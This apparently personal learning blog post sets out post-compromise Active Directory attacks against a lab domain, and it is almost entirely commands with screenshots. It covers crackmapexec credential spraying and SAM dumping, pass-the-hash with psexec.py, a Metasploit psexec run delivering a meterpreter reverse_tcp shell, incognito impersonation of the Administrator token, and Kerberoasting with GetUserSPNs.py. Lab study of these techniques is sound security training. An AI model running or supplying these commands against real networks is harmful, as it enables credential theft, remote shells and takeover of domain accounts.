---
title: Active Directory Attacks, Post-Compromise attacks (Part 3)
date: 2023-10-23
categories: [Learning, Active Directory]
tags: [Active Directory, AD]
author: barabulkit
---

## Pass the Password

```shell
crackmapexec smb 192.168.1.0/24 -u Frank -d ARASAKA.local -p Mypassword123! --sam
```
 ![crackmapexec](/assets/img/acd/crackmapexec.png)

```shell
psexec.py 'arasaka/frank:Mypassword123!@192.168.1.104' 
```
  ![psexec](/assets/img/acd/psexecshell.png)

## Pass the Hash

```shell
crackmapexec smb 192.168.1.0/24 -u Frank -H 18721c3caef628a6080664923ed12367 --local-auth
psexec.py 'frank@192.168.1.104' -hashes aad3b435b51404eeaad3b435b51404ee:18721c3caef628a6080664923ed12367
```

## Token Impersonation

```shell
msfconsole
use exploit/windows/smb/psexec
set rhost 192.168.1.104
set smbdomain arasaka.local
set smbpass Mypassword123!
set smbuser Frank
set target 2
set payload windows/x64/meterpreter/reverse_tcp
set lhost eth0
run
load incognito
impersonate_token ARASAKA\\Администратор
```

![tokenimpersonation](/assets/img/acd/tokenimpersonation.png)

## Kerberoasting 

```shell
GetUserSPNs.py arasaka.local/frank:Mypassword123! -dc-ip 192.168.1.100 -request
```

![kerberoasting](/assets/img/acd/kerberoasting.png)